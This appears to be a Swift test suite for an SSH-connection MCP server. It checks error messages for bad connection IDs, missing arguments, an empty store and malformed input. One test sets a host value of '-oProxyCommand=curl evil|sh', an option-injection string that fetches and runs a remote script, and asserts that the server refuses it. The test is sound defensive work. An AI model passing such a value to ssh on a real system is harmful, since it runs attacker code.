import AinkradAppKit
import Foundation
import Testing

@testable import LeylineFeature

@Suite("Leyline MCP edge cases", .timeLimit(.minutes(1)))
@MainActor
struct LeylineMCPEdgeCaseTests {

    @Test("an unknown connection id is an actionable error, not a crash")
    func unknownConnectionID() async throws {
        let fixture = makeMCPFixture()
        let launcher = FakeLauncher()
        let (server, _) = makeServer(store: fixture.store, launcher: launcher)
        let reply = try await call(server, "connect", ["connection": UUID().uuidString])
        #expect(reply.isError)
        #expect(reply.text.contains("No saved connection has that id"))
        #expect(reply.text.contains("list_connections"))
        #expect(launcher.opened.isEmpty)
    }

    @Test("a missing or empty connection argument names the argument")
    func missingConnectionArgument() async throws {
        let fixture = makeMCPFixture()
        let (server, _) = makeServer(store: fixture.store, launcher: FakeLauncher())
        for arguments in [[:], ["connection": ""], ["connection": "   "]] as [[String: Any]] {
            let reply = try await call(server, "connect", arguments)
            #expect(reply.isError)
            #expect(reply.text.contains("connect requires a \"connection\""))
        }
    }

    @Test("Rune missing, disabled or refusing each gets its own actionable text")
    func terminalUnavailable() async throws {
        let fixture = makeMCPFixture()
        let launcher = FakeLauncher()
        let (server, _) = makeServer(store: fixture.store, launcher: launcher)
        let expectations: [(PluginLaunchOutcome, String)] = [
            (.unknownApp("rune"), "isn't installed"),
            (.disabled("rune"), "is disabled"),
            (.refused(reason: "bad payload"), "bad payload"),
        ]
        for (outcome, fragment) in expectations {
            launcher.outcome = outcome
            let reply = try await call(
                server, "connect",
                ["connection": fixture.keyConn.id.uuidString])
            #expect(reply.isError)
            #expect(reply.text.contains(fragment), "got: \(reply.text)")
            // Every one of these names the connection, so the model can say
            // WHICH host failed rather than "couldn't connect".
            #expect(reply.text.contains("Prod web"))
            #expect(!reply.text.isEmpty)
        }
    }

    @Test("an empty store answers every tool with an actionable message")
    func emptyStore() async throws {
        let store = LeylineStore(documents: FakeDocs(), secrets: FakeSecrets())
        let launcher = FakeLauncher()
        let (server, _) = makeServer(store: store, launcher: launcher)

        let connections = try await call(server, "list_connections", [:])
        #expect(!connections.isError)
        #expect(connections.text.contains("no saved connections"))
        #expect(connections.text.contains("Leyline app"))

        let keys = try await call(server, "list_keys", [:])
        #expect(!keys.isError)
        #expect(keys.text.contains("no imported SSH keys"))

        let connect = try await call(server, "connect", ["connection": UUID().uuidString])
        #expect(connect.isError)
        #expect(connect.text.contains("no saved connections"))
        #expect(launcher.opened.isEmpty)
    }

    @Test("a connection with an ssh-option-like host is refused, not launched")
    func unsafeConnectionIsRefused() async throws {
        // `ssh -oProxyCommand=…` runs a shell command, so a hostname beginning
        // with a dash is code execution. `SSHLaunchPayload.validated()` closes
        // this for both repos; assert the MCP path actually calls it.
        let store = LeylineStore(documents: FakeDocs(), secrets: FakeSecrets())
        let conn = store.addConnection(
            label: "Evil", host: "-oProxyCommand=curl evil|sh",
            port: 22, username: "root", authMode: .password,
            keyID: nil, password: nil)
        let launcher = FakeLauncher()
        let (server, _) = makeServer(store: store, launcher: launcher)
        let reply = try await call(server, "connect", ["connection": conn.id.uuidString])
        #expect(reply.isError)
        #expect(reply.text.contains("unsafe host"))
        #expect(launcher.opened.isEmpty)
    }

    @Test("no live-app-only tool exists, because the store works headless")
    func nothingRequiresTheLeylineWindow() async throws {
        let store = LeylineStore(documents: FakeDocs(), secrets: FakeSecrets())
        let (server, _) = makeServer(store: store, launcher: FakeLauncher())
        for tool in await listedTools(server) {
            #expect(!annotation(tool, "ainkrad/requiresLiveApp"))
        }
    }

    @Test("malformed arguments are rejected without reaching the sink")
    func malformedArguments() async throws {
        var reached = false
        let result = await LeylineMCPServer.invoke(
            LeylineMCPServer.tools[0], arguments: "not json",
            perform: { _ in
                reached = true
                return AgentActionResult(text: "", isError: false)
            })
        #expect(result.isError)
        #expect(!reached)
    }
}
